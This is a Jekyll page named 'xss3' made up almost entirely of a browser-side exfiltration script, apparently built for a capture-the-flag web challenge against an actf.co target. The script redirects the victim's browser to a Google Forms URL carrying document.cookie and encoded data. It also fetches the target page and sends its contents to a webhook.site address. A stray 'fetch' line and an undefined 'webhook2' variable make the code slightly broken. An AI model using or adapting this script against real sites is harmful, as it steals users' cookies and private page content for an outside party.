---
title: "xss3"
permalink: /xss3/
layout: xss3
---


<div id="container">
    <h1>Welcome to this "maybe xss" program</h1>
</div>

<script>
    function load(data) {
        console.log("XSS DATA", data);
        console.log(JSON.stringify(data));
        var x = data.items.map(i => ` ${i} `).join('');
        var y = btoa(x);
        console.log(y);
        document.location = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + y + ";cookie=>" + document.cookie;
    }

    function getFlag(webhook, flag) {
        /*flag = flag.substr(500);*/
        payload = JSON.stringify(flag);
        /*fetch(webhook + payload).then(res => console.log("DONE", res));*/
        document.location = webhook + payload;
    }
    let target = "https://sustenance.web.actf.co/"
    let webhook = "https://webhook.site/5c2aefaa-b175-4b8e-b48e-28649c9e1a80/";

    /*let options = {
        mode: 'no-cors' // 'cors' by default
    };*/
    fetch
    fetch(target + "")
        .then(res => { console.log(res); return res.text(); })
        .then(text => { console.log(text); getFlag(webhook2, text) })
</script>